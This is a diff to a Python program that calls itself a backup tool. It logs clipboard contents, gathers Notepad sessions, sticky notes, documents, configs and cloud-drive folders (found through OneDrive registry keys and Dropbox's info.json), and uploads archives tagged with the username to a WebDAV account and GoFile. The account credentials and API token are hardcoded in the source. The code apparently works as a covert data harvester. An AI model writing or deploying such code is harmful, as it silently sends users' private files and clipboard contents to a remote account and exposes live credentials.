@@ -69,6 +69,8 @@ def task_label(label):
         return '便签'
     if label == 'notepad_session':
         return '记事本会话'
+    if label == 'wins_data':
+        return 'AutoBackup 数据'
     if label == 'specified':
         return '指定文件'
     match = re.fullmatch(r'disk_(.+)_(docs|configs)', label)
@@ -193,6 +195,26 @@ def load_optional_dependencies():
 
 
 class BackupConfig:
+    UPLOAD_MAX_ATTEMPTS = 5
+    CLIPBOARD_MAX_CONTENT_LENGTH = 64 * 1024
+    WORKER_JOIN_TIMEOUT = 10
+
+    def __init__(self):
+        self.BACKUP_ROOT = type(self).BACKUP_ROOT
+        self._derive_paths()
+        self._derived_initialized = True
+
+    def __setattr__(self, name, value):
+        object.__setattr__(self, name, value)
+        if name == 'BACKUP_ROOT' and getattr(self, '_derived_initialized', False):
+            self._derive_paths()
+
+    def _derive_paths(self):
+        self.STAGING_ROOT = os.path.join(self.BACKUP_ROOT, 'staging')
+        self.ARTIFACT_ROOT = os.path.join(self.BACKUP_ROOT, 'artifacts')
+        self.STATE_FILE = os.path.join(self.BACKUP_ROOT, 'backup_state.json')
+        self.THRESHOLD_FILE = os.path.join(self.BACKUP_ROOT, 'next_backup_time.txt')
+        self.LOG_FILE = os.path.join(self.BACKUP_ROOT, 'backup.log')
     """备份配置类"""
     
     # 调试配置
@@ -207,7 +229,6 @@ class BackupConfig:
     RETRY_DELAY = 30  # 重试等待时间（秒）
     UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
     MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
-    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
     FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
     FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
     
@@ -222,15 +243,12 @@ class BackupConfig:
     CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
     BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
     ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
-    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
     
     # 文件操作配置
     SCAN_TIMEOUT = 1200  # 扫描目录超时时间（秒）
     FILE_RETRY_COUNT = 3  # 文件访问重试次数
     FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
     COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
-    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
-    PROGRESS_LOG_INTERVAL = 10  # 每N个文件记录一次进度
     
     # 磁盘空间检查
     MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
@@ -530,6 +548,7 @@ class CollectionResult:
     files: dict = field(default_factory=dict)
     fingerprints: dict = field(default_factory=dict)
     errors: list = field(default_factory=list)
+    warnings: list = field(default_factory=list)
     skipped: int = 0
     timed_out: bool = False
 
@@ -546,12 +565,14 @@ class CollectionResult:
 class ArchiveResult:
     paths: list
     redundant_archive: str = None
+    split_directory: str = None
 
 
 @dataclass
 class SplitResult:
     paths: list
     split: bool = False
+    directory: str = None
 
 
 @dataclass
@@ -625,7 +646,12 @@ class SnapshotFileHandler(logging.FileHandler):
                 os.replace(self.baseFilename, target)
                 return target
             finally:
-                self.stream = self._open()
+                try:
+                    self.stream = self._open()
+                except Exception as exc:
+                    self.stream = None
+                    print('autobackup: failed to reopen log after snapshot: %s' % exc,
+                          file=sys.stderr)
         finally:
             self.release()
 
@@ -687,6 +713,13 @@ class BackupManager:
             raise RuntimeError("requests 尚未加载")
         for directory in (self.config.BACKUP_ROOT, self.config.STAGING_ROOT, self.config.ARTIFACT_ROOT):
             os.makedirs(directory, exist_ok=True)
+        self._backup_root_canonical = os.path.normcase(
+            os.path.realpath(os.path.abspath(self.config.BACKUP_ROOT)))
+        self._exclude_dirs = frozenset(
+            name.casefold() for name in self.config.EXCLUDE_INSTALL_DIRS)
+        self._exclude_keywords = frozenset(
+            name.casefold() for name in self.config.EXCLUDE_KEYWORDS)
+        self._pending_index = None
         # Infini Cloud 配置
         self.infini_url = "https://otaru.infini-cloud.net/dav/"
         self.infini_user = "macstar"  #infini-cloud-8
@@ -721,7 +754,7 @@ class BackupManager:
             self.config.LOG_FILE = os.path.join(log_directory, log_prefix + log_name)
         self.config.INFINI_REMOTE_BASE_DIR = user_prefix + '_wins_backup'
         self.session = requests.Session()
-        self.session.verify = False
+        self.session.verify = True
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
         # GoFile API token（备选方案）：主 token 失败时回退到备用 token
         self.api_token = "hdgZFyRDVPmWYhZRAJVYciBAVCjCfjZl"
@@ -792,6 +825,25 @@ class BackupManager:
         }
 
     @staticmethod
+    def _metadata_signature(path):
+        metadata = os.stat(path)
+        return {
+            'kind': 'file',
+            'size': metadata.st_size,
+            'mtime_ns': metadata.st_mtime_ns,
+        }
+
+    @staticmethod
+    def _entry_signature_matches(entry, signature):
+        if not isinstance(entry, dict) or not isinstance(signature, dict):
+            return False
+        return (
+            entry.get('kind') == signature.get('kind')
+            and entry.get('size') == signature.get('size')
+            and entry.get('mtime_ns') == signature.get('mtime_ns')
+        )
+
+    @staticmethod
     def _entry_matches(entry, fingerprint):
         if not isinstance(entry, dict) or not isinstance(fingerprint, dict):
             return False
@@ -802,19 +854,55 @@ class BackupManager:
         )
 
     def _pending_contains(self, rel_key, fingerprint):
+        return any(self._entry_matches(entry, fingerprint)
+                   for entry in self._pending_entries(rel_key))
+
+    def _rebuild_pending_index(self):
+        index = {}
+        entries = self.state.get('pending', [])
+        failed_groups = {entry['group'] for entry in entries
+                         if entry.get('status') == 'failed'}
+        active_groups = {entry['group'] for entry in entries
+                         if entry.get('status') in ('pending', 'uploaded')
+                         and entry.get('group') not in failed_groups}
+        for group, pending in self.state.get('pending_archives', {}).items():
+            if not isinstance(pending, dict):
+                continue
+            if group not in active_groups:
+                continue
+            for rel_key, entry in pending.get('files', {}).items():
+                if isinstance(rel_key, str) and isinstance(entry, dict):
+                    index.setdefault(rel_key, []).append(entry)
+        return index
+
+    def _pending_entries(self, rel_key):
         with self._state_lock:
-            pending_archives = list(self.state.get('pending_archives', {}).values())
-        for pending in pending_archives:
-            entry = pending.get('files', {}).get(rel_key) if isinstance(pending, dict) else None
-            if self._entry_matches(entry, fingerprint):
-                return True
-        return False
+            if self._pending_index is None:
+                self._pending_index = self._rebuild_pending_index()
+            return list(self._pending_index.get(rel_key, ()))
+
+    def _pending_signature_contains(self, rel_key, signature):
+        return any(self._entry_signature_matches(entry, signature)
+                   for entry in self._pending_entries(rel_key))
 
     def _source_change_status(self, rel_key, source_path, fingerprint=None):
         """返回 (内容是否已备份或已在待上传归档中, 当前指纹)。"""
-        fingerprint = fingerprint or self._path_fingerprint(source_path)
+        if fingerprint is not None:
+            with self._state_lock:
+                entry = self.state.get('files', {}).get(rel_key)
+            if self._entry_matches(entry, fingerprint):
+                return True, fingerprint
+            if self._pending_contains(rel_key, fingerprint):
+                return True, fingerprint
+            return False, fingerprint
+        signature = self._metadata_signature(source_path)
         with self._state_lock:
             entry = self.state.get('files', {}).get(rel_key)
+        if self._entry_signature_matches(entry, signature):
+            return True, dict(entry)
+        if self._pending_signature_contains(rel_key, signature):
+            return True, None
+        fingerprint = self._path_fingerprint(source_path)
         if self._entry_matches(entry, fingerprint):
             return True, fingerprint
         if self._pending_contains(rel_key, fingerprint):
@@ -840,6 +928,42 @@ class BackupManager:
                 updated['recorded_at_ns'] = recorded_at_ns
                 indexed_files[rel_key] = updated
 
+    def _validate_pending_item(self, item, seen_ids):
+        if not isinstance(item, dict):
+            raise ValueError('invalid pending item')
+        required = ('id', 'group', 'kind', 'path', 'size', 'sha256', 'status')
+        if any(key not in item for key in required):
+            raise ValueError('pending item is missing required fields')
+        if not isinstance(item['id'], str) or not item['id']:
+            raise ValueError('pending item id is invalid')
+        if item['id'] in seen_ids:
+            raise ValueError('duplicate pending item id')
+        seen_ids.add(item['id'])
+        if not isinstance(item['group'], str) or not item['group']:
+            raise ValueError('pending item group is invalid')
+        if not isinstance(item['kind'], str) or not item['kind']:
+            raise ValueError('pending item kind is invalid')
+        if not isinstance(item['path'], str) or not item['path'] or os.path.isabs(item['path']):
+            raise ValueError('pending item path is invalid')
+        if (not isinstance(item['size'], int) or isinstance(item['size'], bool)
+                or item['size'] < 0):
+            raise ValueError('pending item size is invalid')
+        if (not isinstance(item['sha256'], str)
+                or re.fullmatch(r'[0-9a-fA-F]{64}', item['sha256']) is None):
+            raise ValueError('pending item sha256 is invalid')
+        if item['status'] not in ('pending', 'uploaded', 'failed'):
+            raise ValueError('pending item status is invalid')
+        item.setdefault('attempts', 0)
+        if (not isinstance(item['attempts'], int) or isinstance(item['attempts'], bool)
+                or item['attempts'] < 0):
+            raise ValueError('pending item attempts is invalid')
+        item.setdefault('last_error', None)
+        if item['last_error'] is not None and not isinstance(item['last_error'], str):
+            raise ValueError('pending item last_error is invalid')
+        path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
+        if not is_within(path, self.config.ARTIFACT_ROOT):
+            raise ValueError('pending item path escapes artifacts directory')
+
     def _load_state(self):
         state = {
             'version': 1,
@@ -850,6 +974,7 @@ class BackupManager:
             'pending': [],
             'files': {},
             'pending_archives': {},
+            'orphaned_artifacts': [],
             'cycle_archives': 0,
             'next_app_state_backup': None,
             'app_state_retry_after': None,
@@ -871,12 +996,9 @@ class BackupManager:
                 raise ValueError('备份状态文件格式无效；已保留原文件')
             if not isinstance(state['pending'], list):
                 raise ValueError('待上传清单无效')
+            seen_ids = set()
             for item in state['pending']:
-                path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
-                if not is_within(path, self.config.ARTIFACT_ROOT):
-                    raise ValueError('待上传清单包含越界路径')
-                if item['status'] not in ('pending', 'uploaded') or not item['group']:
-                    raise ValueError('待上传状态无效')
+                self._validate_pending_item(item, seen_ids)
             files = state.get('files')
             pending_archives = state.get('pending_archives')
             state['files'] = {
@@ -893,11 +1015,39 @@ class BackupManager:
                 key: value for key, value in pending_archives.items()
                 if key in pending_groups
             }
+            orphaned = state.get('orphaned_artifacts')
+            if (not isinstance(orphaned, list)
+                    or any(not isinstance(item, str) or not item or os.path.isabs(item)
+                           for item in orphaned)):
+                raise ValueError('invalid orphaned artifact list')
+            state['orphaned_artifacts'] = list(dict.fromkeys(orphaned))
+            for relative in state['orphaned_artifacts']:
+                if not is_within(os.path.join(self.config.ARTIFACT_ROOT, relative),
+                                 self.config.ARTIFACT_ROOT):
+                    raise ValueError('orphaned artifact path escapes artifacts directory')
+            for archive_state in state['pending_archives'].values():
+                created_at_ns = archive_state.get('created_at_ns')
+                if (created_at_ns is not None
+                        and (not isinstance(created_at_ns, int)
+                             or isinstance(created_at_ns, bool) or created_at_ns < 0)):
+                    raise ValueError('invalid pending archive timestamp')
+                relative = archive_state.get('redundant_archive')
+                if relative is None:
+                    continue
+                if (not isinstance(relative, str) or not relative
+                        or os.path.isabs(relative)):
+                    raise ValueError('invalid redundant archive path')
+                if not is_within(os.path.join(self.config.ARTIFACT_ROOT, relative),
+                                  self.config.ARTIFACT_ROOT):
+                    raise ValueError('redundant archive path escapes artifacts directory')
             for name in ('next_backup', 'retry_after', 'last_success',
                          'next_app_state_backup', 'app_state_retry_after',
                          'last_app_state_success'):
                 if state[name]:
-                    datetime.fromisoformat(state[name])
+                    try:
+                        datetime.fromisoformat(state[name])
+                    except (TypeError, ValueError):
+                        raise ValueError('invalid state timestamp') from None
         elif os.path.exists(self.config.THRESHOLD_FILE):
             try:
                 with open(self.config.THRESHOLD_FILE, 'r', encoding='utf-8') as stream:
@@ -911,6 +1061,7 @@ class BackupManager:
     def _commit_state(self, state):
         atomic_json(self.config.STATE_FILE, state)
         self.state = state
+        self._pending_index = None
 
     def update_state(self, **changes):
         with self._state_lock:
@@ -918,7 +1069,7 @@ class BackupManager:
             state.update(changes)
             self._commit_state(state)
 
-    def enqueue_files(self, paths, kind='backup', file_records=None):
+    def enqueue_files(self, paths, kind='backup', file_records=None, redundant_archive=None):
         group = uuid.uuid4().hex
         entries = []
         for path in paths:
@@ -929,22 +1080,54 @@ class BackupManager:
                 'path': os.path.relpath(path, self.config.ARTIFACT_ROOT),
                 'size': os.path.getsize(path), 'sha256': file_digest(path),
                 'status': 'pending',
+                'attempts': 0, 'last_error': None,
             })
         with self._state_lock:
             state = copy.deepcopy(self.state)
-            existing = {item['path'] for item in state['pending']}
+            existing = {item['path'] for item in state['pending']
+                        if item['status'] != 'failed'}
             state['pending'].extend(item for item in entries if item['path'] not in existing)
             if file_records:
-                state.setdefault('pending_archives', {})[group] = {
+                archive_state = {
                     'created_at': datetime.now().isoformat(timespec='seconds'),
                     'created_at_ns': time.time_ns(),
                     'files': copy.deepcopy(file_records),
                 }
+                if redundant_archive:
+                    if not is_within(redundant_archive, self.config.ARTIFACT_ROOT):
+                        raise ValueError('redundant archive must be inside artifacts')
+                    archive_state['redundant_archive'] = os.path.relpath(
+                        redundant_archive, self.config.ARTIFACT_ROOT)
+                state.setdefault('pending_archives', {})[group] = archive_state
             self._commit_state(state)
 
     def has_pending(self, kind=None):
         with self._state_lock:
-            return any(kind is None or item['kind'] == kind for item in self.state['pending'])
+            return any((kind is None or item['kind'] == kind)
+                       and item['status'] == 'pending'
+                       for item in self.state['pending'])
+
+    def _record_upload_failure(self, item, error):
+        max_attempts = max(1, int(getattr(self.config, 'UPLOAD_MAX_ATTEMPTS', 5)))
+        with self._state_lock:
+            state = copy.deepcopy(self.state)
+            updated = None
+            for entry in state['pending']:
+                if entry.get('id') != item['id']:
+                    continue
+                entry['attempts'] = int(entry.get('attempts', 0)) + 1
+                entry['last_error'] = str(error)[:500]
+                if entry['attempts'] >= max_attempts:
+                    entry['status'] = 'failed'
+                    DETAIL_LOGGER.error('upload item quarantined after %s attempts: %s',
+                                        entry['attempts'], entry['path'])
+                updated = dict(entry)
+                break
+            try:
+                self._commit_state(state)
+            except Exception:
+                DETAIL_LOGGER.exception('failed to persist upload attempt state')
+            return updated
 
     def process_pending_uploads(self, kind=None):
         if not self._upload_lock.acquire(blocking=False):
@@ -954,6 +1137,7 @@ class BackupManager:
         scope = kind or 'all'
         failed_kinds = set()
         try:
+            self._cleanup_orphaned_artifacts()
             with self._state_lock:
                 pending = copy.deepcopy(self.state['pending'])
             candidates = [item for item in pending
@@ -967,7 +1151,7 @@ class BackupManager:
             for item in pending:
                 if self.stop_event.is_set():
                     break
-                if (kind is not None and item['kind'] != kind) or item['status'] == 'uploaded':
+                if (kind is not None and item['kind'] != kind) or item['status'] != 'pending':
                     continue
                 attempted += 1
                 path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
@@ -978,6 +1162,9 @@ class BackupManager:
                         raise ValueError('待上传文件与清单校验不符')
                     if not self.upload_file(path):
                         failed_kinds.add(item['kind'])
+                        if self.stop_event.is_set():
+                            break
+                        self._record_upload_failure(item, 'upload_file returned False')
                         continue
                     with self._state_lock:
                         state = copy.deepcopy(self.state)
@@ -986,12 +1173,14 @@ class BackupManager:
                                 entry['status'] = 'uploaded'
                         self._commit_state(state)
                     confirmed += 1
-                except Exception:
+                except Exception as exc:
                     failed_kinds.add(item['kind'])
+                    self._record_upload_failure(item, exc)
                     DETAIL_LOGGER.exception('待上传文件处理失败，保留本地副本: %s', path)
             # 同一组全部上传完成并持久化后，才提升为已上传索引并删除本地分片。
             completed = set()
             removable = []
+            redundant_archives = []
             cleanup_failed = False
             try:
                 with self._state_lock:
@@ -1004,6 +1193,14 @@ class BackupManager:
                                  if item['group'] in completed]
                     if removable:
                         state = copy.deepcopy(self.state)
+                        for group in completed:
+                            pending_archive = state.get('pending_archives', {}).get(group)
+                            if not isinstance(pending_archive, dict):
+                                continue
+                            relative = pending_archive.get('redundant_archive')
+                            if isinstance(relative, str) and relative:
+                                redundant_archives.append(os.path.join(
+                                    self.config.ARTIFACT_ROOT, relative))
                         self._promote_pending_archives(state, completed)
                         state['pending'] = [
                             item for item in state['pending']
@@ -1015,10 +1212,22 @@ class BackupManager:
                 failed_kinds.update(item['kind'] for item in removable)
                 DETAIL_LOGGER.exception('上传完成状态或文件索引持久化失败，保留本地归档')
             if removable and not cleanup_failed:
+                cleanup_ok = True
+                failed_cleanup = []
                 for item in removable:
-                    self._safe_remove_file(os.path.join(self.config.ARTIFACT_ROOT, item['path']))
+                    artifact_path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
+                    if not self._safe_remove_file(artifact_path):
+                        cleanup_ok = False
+                        failed_cleanup.append(artifact_path)
+                if cleanup_ok:
+                    for path in redundant_archives:
+                        if not self._safe_remove_file(path):
+                            failed_cleanup.append(path)
+                if failed_cleanup:
+                    self._remember_orphaned_artifacts(failed_cleanup)
             with self._state_lock:
-                remaining = sum(kind is None or item['kind'] == kind
+                remaining = sum((kind is None or item['kind'] == kind)
+                                and item['status'] == 'pending'
                                 for item in self.state['pending'])
                 remaining_kinds = {item['kind'] for item in self.state['pending']}
             if attempted or cleanup_failed:
@@ -1109,11 +1318,6 @@ class BackupManager:
                 return False
 
     @staticmethod
-    def _get_dir_size(directory):
-        return sum(os.path.getsize(os.path.join(root, name))
-                   for root, _, files in os.walk(directory) for name in files)
-
-    @staticmethod
     def _is_valid_file(file_path):
         try:
             return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
@@ -1128,6 +1332,7 @@ class BackupManager:
             try:
                 if os.path.exists(file_path):
                     os.remove(file_path)
+                self._remove_empty_parts_directory(file_path)
                 return True
             except OSError:
                 if attempt + 1 < attempts:
@@ -1137,16 +1342,92 @@ class BackupManager:
                   '部分已上传归档未能清理，本地文件已保留；详情见文件日志')
         return False
 
+    def _remove_empty_parts_directory(self, file_path):
+        parent = os.path.dirname(os.path.abspath(file_path))
+        if not os.path.basename(parent).startswith('parts-'):
+            return
+        if not is_within(parent, self.config.ARTIFACT_ROOT, include_root=True):
+            return
+        try:
+            os.rmdir(parent)
+        except OSError:
+            pass
+
+    def _remember_orphaned_artifacts(self, paths):
+        relatives = []
+        for path in paths:
+            if is_within(path, self.config.ARTIFACT_ROOT):
+                relatives.append(os.path.relpath(path, self.config.ARTIFACT_ROOT))
+        if not relatives:
+            return
+        with self._state_lock:
+            state = copy.deepcopy(self.state)
+            orphaned = state.setdefault('orphaned_artifacts', [])
+            for relative in relatives:
+                if relative not in orphaned:
+                    orphaned.append(relative)
+            try:
+                self._commit_state(state)
+            except Exception:
+                DETAIL_LOGGER.exception('failed to persist orphaned artifact state')
+
+    def _cleanup_orphaned_artifacts(self):
+        with self._state_lock:
+            orphaned = list(self.state.get('orphaned_artifacts', []))
+        if not orphaned:
+            return
+        remaining = []
+        removed = 0
+        for relative in orphaned:
+            full_path = os.path.join(self.config.ARTIFACT_ROOT, relative)
+            if not is_within(full_path, self.config.ARTIFACT_ROOT):
+                continue
+            if not os.path.exists(full_path):
+                continue
+            if self._safe_remove_file(full_path):
+                removed += 1
+            else:
+                remaining.append(relative)
+        if len(remaining) == len(orphaned):
+            return
+        with self._state_lock:
+            state = copy.deepcopy(self.state)
+            state['orphaned_artifacts'] = remaining
+            try:
+                self._commit_state(state)
+            except Exception:
+                DETAIL_LOGGER.exception('failed to persist orphaned artifact cleanup')
+        if removed:
+            DETAIL_LOGGER.info('removed %s orphaned artifact(s)', removed)
+
     def should_exclude_dir(self, path):
-        if is_within(path, self.config.BACKUP_ROOT, include_root=True):
+        if self._is_within_backup_root(path, include_root=True):
             return True
         parts = [part.casefold() for part in os.path.normpath(path).split(os.sep)]
-        excluded = {name.casefold() for name in self.config.EXCLUDE_INSTALL_DIRS}
-        keywords = {name.casefold() for name in self.config.EXCLUDE_KEYWORDS}
         for part in parts:
-            if part in excluded or part in keywords:
+            if part in self._exclude_dirs or part in self._exclude_keywords:
                 return True
         return False
+
+    def _is_within_backup_root(self, path, include_root=False):
+        candidate = os.path.normcase(os.path.realpath(os.path.abspath(path)))
+        root = self._backup_root_canonical
+        try:
+            return (os.path.commonpath([candidate, root]) == root
+                    and (include_root or candidate != root))
+        except ValueError:
+            return False
+
+    @staticmethod
+    def _is_link_or_reparse(path):
+        if os.path.islink(path):
+            return True
+        try:
+            metadata = os.lstat(path)
+        except OSError:
+            return False
+        tag = getattr(metadata, 'st_reparse_tag', 0)
+        return tag in (0xA0000003, 0xA000000C)
 
     @staticmethod
     def _check_deadline(deadline):
@@ -1232,7 +1513,8 @@ class BackupManager:
                 if os.path.exists(sidecar):
                     os.remove(sidecar)
 
-    def _collect_file(self, source, relative, result, deadline, sqlite_snapshot=False):
+    def _collect_file(self, source, relative, result, deadline, sqlite_snapshot=False,
+                      best_effort=False):
         target = os.path.join(result.directory, relative)
         if not is_within(target, result.directory):
             result.errors.append('备份相对路径越界: ' + relative)
@@ -1240,7 +1522,7 @@ class BackupManager:
         rel_key = self._state_key(source)
         for attempt in range(self.config.FILE_RETRY_COUNT):
             try:
-                if os.path.islink(source):
+                if self._is_link_or_reparse(source):
                     result.skipped += 1
                     DETAIL_LOGGER.warning('跳过符号链接: %s', source)
                     return
@@ -1279,21 +1561,31 @@ class BackupManager:
                 except OSError:
                     pass
                 if attempt + 1 == self.config.FILE_RETRY_COUNT:
-                    result.errors.append(str(exc) + ': ' + source)
-                    DETAIL_LOGGER.error('文件备份失败: %s: %s', source, exc)
+                    if best_effort:
+                        result.warnings.append(str(exc) + ': ' + source)
+                        result.skipped += 1
+                        DETAIL_LOGGER.warning('file collection skipped: %s: %s', source, exc)
+                    else:
+                        result.errors.append(str(exc) + ': ' + source)
+                        DETAIL_LOGGER.error('文件备份失败: %s: %s', source, exc)
                 else:
                     self.stop_event.wait(self.config.FILE_RETRY_DELAY)
 
     def _collect_tree(self, source, result, deadline, prefix='', extensions=None, excluded=False,
-                      file_filter=None):
+                      file_filter=None, allow_backup_root=False, best_effort=False):
         def onerror(error):
-            result.errors.append(str(error))
+            if best_effort:
+                result.warnings.append(str(error))
+                result.skipped += 1
+            else:
+                result.errors.append(str(error))
 
         for root, directories, files in os.walk(source, topdown=True, onerror=onerror, followlinks=False):
             self._check_deadline(deadline)
             if self.stop_event.is_set():
                 raise InterruptedError('任务已停止')
-            if is_within(root, self.config.BACKUP_ROOT, include_root=True):
+            if (not allow_backup_root and
+                    self._is_within_backup_root(root, include_root=True)):
                 directories.clear()
                 result.skipped += 1
                 continue
@@ -1304,7 +1596,9 @@ class BackupManager:
             allowed = []
             for name in directories:
                 path = os.path.join(root, name)
-                if (os.path.islink(path) or is_within(path, self.config.BACKUP_ROOT, include_root=True) or
+                if (self._is_link_or_reparse(path) or
+                        (not allow_backup_root and
+                         self._is_within_backup_root(path, include_root=True)) or
                         (excluded and self.should_exclude_dir(path))):
                     result.skipped += 1
                     continue
@@ -1322,7 +1616,8 @@ class BackupManager:
                 if file_filter and not file_filter(name):
                     result.skipped += 1
                     continue
-                self._collect_file(path, os.path.join(relative_root, name), result, deadline)
+                self._collect_file(path, os.path.join(relative_root, name), result, deadline,
+                                   best_effort=best_effort)
                 if result.timed_out or self.stop_event.is_set():
                     return
 
@@ -1373,6 +1668,17 @@ class BackupManager:
 
 
     def split_large_file(self, file_path):
+        before = set(glob.glob(os.path.join(os.path.dirname(file_path), 'parts-*')))
+        try:
+            return self._split_large_file_impl(file_path)
+        except Exception:
+            for directory in set(glob.glob(os.path.join(
+                    os.path.dirname(file_path), 'parts-*'))) - before:
+                if is_within(directory, self.config.ARTIFACT_ROOT):
+                    shutil.rmtree(directory, ignore_errors=True)
+            raise
+
+    def _split_large_file_impl(self, file_path):
         """不需分片返回显式状态；任何失败抛异常并保留原文件。"""
         size = os.path.getsize(file_path)
         limit = min(self.config.CHUNK_SIZE, self.config.MAX_SINGLE_FILE_SIZE)
@@ -1425,7 +1731,8 @@ class BackupManager:
         atomic_json(manifest_path, manifest)
         if os.path.getsize(manifest_path) > self.config.MAX_SINGLE_FILE_SIZE:
             raise ValueError('分片清单本身超过上传限制，原归档已保留')
-        return SplitResult([os.path.join(directory, part['name']) for part in parts] + [manifest_path], True)
+        return SplitResult([os.path.join(directory, part['name']) for part in parts] + [manifest_path],
+                           True, directory)
 
     @staticmethod
     def _verify_archive(path, root_name, expected):
@@ -1465,8 +1772,7 @@ class BackupManager:
                     expected[relative] = {'size': os.path.getsize(path), 'sha256': file_digest(path)}
         directory, filename = os.path.split(zip_file_path)
         # 所有归档统一添加用户名前 5 字符前缀，分片自动继承该文件名。
-        if not filename.startswith(self.user_prefix):
-            filename = self.user_prefix + filename
+        filename = self.user_prefix + filename
         tar_path = os.path.join(directory, filename + '.tar.gz')
         if os.path.exists(tar_path):
             raise FileExistsError(tar_path)
@@ -1491,7 +1797,8 @@ class BackupManager:
         self._verify_archive(temporary, root_name, expected)
         os.replace(temporary, tar_path)
         split = self.split_large_file(tar_path)
-        return ArchiveResult(split.paths, tar_path if split.split else None)
+        return ArchiveResult(split.paths, tar_path if split.split else None,
+                             split.directory)
 
     def split_large_directory(self, folder_path, base_zip_path, expected_files=None):
         """与普通归档使用同一流程，单个大文件不会被过滤掉。"""
@@ -1516,12 +1823,6 @@ class BackupManager:
             for path in split.paths:
                 self._safe_remove_file(path)
         return success
-
-    def upload_backup(self, backup_path):
-        paths = backup_path.paths if isinstance(backup_path, ArchiveResult) else backup_path
-        paths = paths if isinstance(paths, list) else [paths]
-        results = [self.upload_file(path) for path in paths]
-        return all(results)
 
     def _remote_relative_path(self, file_path):
         if not is_within(file_path, self.config.ARTIFACT_ROOT):
@@ -1878,6 +2179,11 @@ class BackupManager:
             return None
         # 去除空白字符
         content = content.strip()
+        limit = max(1, int(getattr(self.config, 'CLIPBOARD_MAX_CONTENT_LENGTH', 64 * 1024)))
+        if len(content) > limit:
+            DETAIL_LOGGER.warning('clipboard content truncated from %s to %s chars',
+                                  len(content), limit)
+            content = content[:limit]
         return content if content else None
 
     def log_clipboard_update(self, content, file_path):
@@ -1916,7 +2222,7 @@ class BackupManager:
         error_count = 0
         max_errors = 5  # 最大连续错误次数（可考虑提取为配置常量）
         
-        while not self.stop_event.is_set:
+        while not self.stop_event.is_set():
             try:
                 current_content = self.get_clipboard_content()
                 # 只有当JTB内容非空且与上次不同时才记录
@@ -1947,6 +2253,188 @@ def is_disk_available(disk_path):
     except Exception:
         return False
 
+
+CLOUD_NAME_PREFIXES = (
+    'onedrive', 'dropbox', 'google drive', 'googledrive',
+    'google drive file stream', 'my drive',
+    'baidunetdisk', 'baidu netdisk', '百度网盘', '百度云',
+    'aliyundrive', 'aliyunpan', '阿里云盘', '阿里云',
+    'weiyun', '微云', '腾讯微云', 'quark', '夸克网盘', '夸克',
+    '115', '115网盘', '115cloud', '123云盘', '123pan',
+    '天翼云盘', '天翼云', '189cloud', 'cloud189',
+    '中国移动云盘', '和彩云', 'cmcccloud', 'nutstore', '坚果云',
+    'icloud', 'icloud drive', 'iclouddrive', 'icloud云盘',
+    'mega', 'megasync', 'pcloud', 'pcloud drive', 'box', 'box drive',
+    'nextcloud', 'owncloud', 'yandex disk', 'yandexdisk',
+    'seafile', 'tresorit', 'mediafire', 'sync.com',
+)
+
+CLOUD_NAME_KEYWORDS = (
+    '云', '网盘', 'cloud', 'drive', 'box', 'onedrive', 'dropbox',
+    'googledrive', 'pcloud', 'mega', 'nutstore', 'weiyun', 'quark',
+    'yandex', 'nextcloud', 'owncloud', 'seafile', 'tresorit', 'mediafire',
+)
+
+
+def _matches_cloud_location(name):
+    lower = str(name or '').strip().casefold()
+    if not lower:
+        return False
+    for prefix in CLOUD_NAME_PREFIXES:
+        if (lower == prefix or lower.startswith(prefix + ' ')
+                or lower.startswith(prefix + '(') or lower.startswith(prefix + '_')):
+            return True
+    return any(keyword in lower for keyword in CLOUD_NAME_KEYWORDS)
+
+
+def _cloud_candidates_from_user_home(user_path):
+    results = []
+    try:
+        entries = os.listdir(user_path)
+    except OSError:
+        return results
+    for name in entries:
+        path = os.path.join(user_path, name)
+        if os.path.isdir(path) and _matches_cloud_location(name):
+            results.append((path, name))
+    return results
+
+
+def _cloud_candidates_from_environment():
+    names = {
+        'onedrive', 'onedriveconsumer', 'onedrivecommercial',
+        'googledrive', 'google_drive', 'dropbox', 'iclouddrive',
+    }
+    results = []
+    for key, value in os.environ.items():
+        if key.casefold() in names and value:
+            results.append((os.path.expandvars(value), key))
+    return results
+
+
+def _cloud_candidates_from_onedrive_registry():
+    if os.name != 'nt':
+        return []
+    try:
+        import winreg
+    except ImportError:
+        return []
+
+    results = []
+
+    def collect(path, label):
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
+                try:
+                    value = winreg.QueryValueEx(key, 'UserFolder')[0]
+                except OSError:
+                    value = None
+                if value:
+                    results.append((value, label))
+                index = 0
+                while True:
+                    try:
+                        subkey_name = winreg.EnumKey(key, index)
+                    except OSError:
+                        break
+                    index += 1
+                    try:
+                        with winreg.OpenKey(key, subkey_name) as subkey:
+                            value = winreg.QueryValueEx(subkey, 'UserFolder')[0]
+                            if value:
+                                results.append((value, f'{label} {subkey_name}'))
+                    except OSError:
+                        continue
+        except OSError:
+            pass
+
+    collect(r'Software\Microsoft\OneDrive', 'OneDrive')
+    collect(r'Software\Microsoft\OneDrive\Accounts', 'OneDrive')
+    return results
+
+
+def _cloud_candidates_from_dropbox():
+    results = []
+    for env_name in ('LOCALAPPDATA', 'APPDATA'):
+        base = os.environ.get(env_name)
+        if not base:
+            continue
+        info_path = os.path.join(base, 'Dropbox', 'info.json')
+        if not os.path.isfile(info_path):
+            continue
+        try:
+            with open(info_path, 'r', encoding='utf-8') as stream:
+                data = json.load(stream)
+        except (OSError, ValueError):
+            continue
